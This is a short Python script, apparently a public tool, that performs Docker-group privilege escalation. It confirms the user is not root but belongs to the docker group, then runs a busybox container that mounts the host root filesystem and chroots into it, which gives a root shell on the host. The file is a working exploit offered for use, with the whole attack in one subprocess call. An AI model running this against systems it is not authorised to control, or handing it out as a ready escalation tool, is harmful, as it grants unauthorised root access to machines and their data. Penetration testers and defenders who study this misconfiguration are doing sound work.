#!/usr/bin/python
#-*-coding:utf-8-*-

#- docker_privilege_escalation_busybox
#- Copyright (C) 2016 Interhack 
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License 
# as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty 
# of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. 
# You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>

__author__ 		= "interhack"
__credits__ 	= "interhack, docker"
__version__ 	= "0.1"
__maintainer__ 	= "interhack"
__email__ 		= "interhack@gmail.com"
__status__ 		= "Development"

import getpass, sys, pwd, grp, subprocess

user = getpass.getuser()
if user == 'root':
	sys.stdout.write('Already root, Exit\n')
	sys.exit(0)
else:
	groups = [g.gr_name for g in grp.getgrall() if user in g.gr_mem]
	gid = pwd.getpwnam(user).pw_gid
	groups.append(grp.getgrgid(gid).gr_name)
	if 'docker' in groups:
		subprocess.call("docker run -it -v /:/mnt busybox chroot /mnt/", shell=True)
	else:
		sys.stderr.write("User " + user + " not in docker group, Exit\n")
